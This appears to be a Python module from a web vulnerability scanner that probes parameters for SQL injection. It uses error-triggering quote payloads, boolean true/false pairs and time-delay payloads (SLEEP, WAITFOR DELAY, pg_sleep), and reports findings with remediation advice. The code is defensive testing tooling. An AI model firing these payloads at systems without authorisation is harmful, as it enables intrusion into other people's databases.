"""
SQL injection detection: error-based, boolean-based (differential) and
time-based (blind). Non-destructive — payloads only read/delay, never write.
"""

from __future__ import annotations

import re
import time

from .base import Module, Severity, Confidence
from .injection import enumerate_points


# DBMS error signatures (strong indicator of error-based SQLi)
_SQL_ERRORS = [
    (re.compile(r"you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"warning:\s+mysqli?_", re.I), "MySQL"),
    (re.compile(r"mysql_fetch_(array|assoc|row)", re.I), "MySQL"),
    (re.compile(r"unclosed quotation mark after the character string", re.I), "MSSQL"),
    (re.compile(r"microsoft ole db provider for sql server", re.I), "MSSQL"),
    (re.compile(r"\bsystem\.data\.sqlclient\.sqlexception", re.I), "MSSQL"),
    (re.compile(r"pg_query\(\)|pg_exec\(\)|postgresql query failed", re.I), "PostgreSQL"),
    (re.compile(r"unterminated quoted string at or near", re.I), "PostgreSQL"),
    (re.compile(r"sqlite_(exception|error)|sqlite3\.OperationalError", re.I), "SQLite"),
    (re.compile(r"ora-\d{5}", re.I), "Oracle"),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle"),
    (re.compile(r"odbc.+driver", re.I), "ODBC"),
    (re.compile(r"\bJDBCException|org\.hibernate", re.I), "JDBC"),
]

# error-triggering payloads
_ERROR_PAYLOADS = ["'", "\"", "')", "';", "\"))", "`", "'\"", "\\"]

# boolean pairs: (true-condition, false-condition) appended to the value
_BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
    ("') AND ('1'='1", "') AND ('1'='2"),
]

# time-based payloads; {t} substituted with delay seconds
_TIME_PAYLOADS = [
    "' AND SLEEP({t})-- -",
    "\" AND SLEEP({t})-- -",
    "' AND (SELECT {n} FROM (SELECT SLEEP({t}))a)-- -",
    "'; WAITFOR DELAY '0:0:{t}'-- -",
    "' AND pg_sleep({t})-- -",
    " AND SLEEP({t})",
    "') AND SLEEP({t})-- -",
]


class SqlInjectionModule(Module):
    name = "sqli"
    description = "SQL injection (error / boolean / time based)"

    def run(self) -> None:
        points = enumerate_points(self.ctx)
        if not points:
            self.log.status("sqli: no parameters/forms discovered to test")
            return
        self.log.status(f"sqli: testing {len(points)} injection point(s)")
        # test points in parallel, but each point runs its stages sequentially
        self.parallel(self._test_point, points, workers=8)

    def _test_point(self, point):
        # 1) error-based (fast, high signal)
        if self._error_based(point):
            return None
        # 2) boolean-based differential
        if self._boolean_based(point):
            return None
        # 3) time-based blind (only if enabled; slower)
        if self.config.get("time_based", True):
            self._time_based(point)
        return None

    # -----------------------------------------------------------------
    def _error_based(self, point) -> bool:
        base = point.baseline_value()
        for payload in _ERROR_PAYLOADS:
            resp = point.send(base + payload, mode="replace")
            if resp is None:
                continue
            for rx, dbms in _SQL_ERRORS:
                if rx.search(resp.text):
                    self.report(
                        title=f"SQL injection (error-based) — {dbms}",
                        severity=Severity.CRITICAL,
                        category="SQL Injection",
                        url=point.url,
                        parameter=point.param,
                        evidence=f"payload={payload!r} triggered {dbms} error: "
                        f"{_snippet(resp.text, rx)}",
                        description="Injecting a syntax-breaking character produced a database "
                        "error, proving user input reaches a SQL query unsanitized.",
                        remediation="Use parameterized queries / prepared statements; never "
                        "concatenate user input into SQL. Apply least-privilege DB accounts.",
                        confidence=Confidence.CONFIRMED,
                        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                    )
                    return True
        return False

    def _boolean_based(self, point) -> bool:
        base = point.baseline_value()
        true_resp = point.send(base, mode="replace")
        if true_resp is None:
            return False
        base_len = len(true_resp.text)
        base_code = true_resp.status_code

        for true_p, false_p in _BOOLEAN_PAIRS:
            rt = point.send(base + true_p, mode="replace")
            rf = point.send(base + false_p, mode="replace")
            if rt is None or rf is None:
                continue
            # TRUE should resemble the original page; FALSE should differ.
            same_true = rt.status_code == base_code and _close(len(rt.text), base_len)
            diff_false = (rf.status_code != rt.status_code) or (
                not _close(len(rf.text), len(rt.text), tol=0.05)
                and abs(len(rf.text) - len(rt.text)) > 40
            )
            if same_true and diff_false:
                self.report(
                    title="SQL injection (boolean-based blind)",
                    severity=Severity.CRITICAL,
                    category="SQL Injection",
                    url=point.url,
                    parameter=point.param,
                    evidence=(
                        f"TRUE payload {true_p!r} -> {rt.status_code}/{len(rt.text)}B ; "
                        f"FALSE payload {false_p!r} -> {rf.status_code}/{len(rf.text)}B "
                        f"(baseline {base_code}/{base_len}B)"
                    ),
                    description="The page content changes predictably between a logically TRUE "
                    "and FALSE injected condition — a hallmark of blind SQL injection.",
                    remediation="Use parameterized queries / prepared statements and input "
                    "validation. Apply least-privilege DB accounts.",
                    confidence=Confidence.FIRM,
                    references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                )
                return True
        return False

    def _time_based(self, point) -> bool:
        base = point.baseline_value()
        delay = int(self.config.get("sqli_delay", 5))

        # establish a normal response time
        t0 = time.monotonic()
        r0 = point.send(base, mode="replace")
        normal = (time.monotonic() - t0) if r0 is not None else 0.5
        threshold = max(delay - 1.0, normal + delay * 0.6)

        for tpl in _TIME_PAYLOADS:
            payload = tpl.format(t=delay, n=1)
            start = time.monotonic()
            resp = point.send(base + payload, mode="replace", timeout=delay + 8)
            elapsed = time.monotonic() - start
            if resp is None:
                continue
            if elapsed >= threshold:
                # confirm: repeat with a larger delay to avoid a one-off network stall
                confirm_delay = delay + 3
                cpayload = tpl.format(t=confirm_delay, n=1)
                cstart = time.monotonic()
                cresp = point.send(base + cpayload, mode="replace", timeout=confirm_delay + 8)
                celapsed = time.monotonic() - cstart
                if cresp is not None and celapsed >= confirm_delay - 1.0 and celapsed > elapsed:
                    self.report(
                        title="SQL injection (time-based blind)",
                        severity=Severity.CRITICAL,
                        category="SQL Injection",
                        url=point.url,
                        parameter=point.param,
                        evidence=(
                            f"payload {payload!r} delayed response {elapsed:.1f}s "
                            f"(normal {normal:.1f}s); confirm {confirm_delay}s -> {celapsed:.1f}s"
                        ),
                        description="Injecting a database sleep function delayed the response by "
                        "the requested amount, proving injectable blind SQL.",
                        remediation="Use parameterized queries / prepared statements. Apply "
                        "least-privilege DB accounts and statement timeouts.",
                        confidence=Confidence.CONFIRMED,
                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                    )
                    return True
        return False


def _close(a: int, b: int, tol: float = 0.02) -> bool:
    if max(a, b) == 0:
        return True
    return abs(a - b) / max(a, b) <= tol


def _snippet(text: str, rx) -> str:
    m = rx.search(text)
    if not m:
        return ""
    start = max(0, m.start() - 40)
    end = min(len(text), m.end() + 60)
    return " ".join(text[start:end].split())
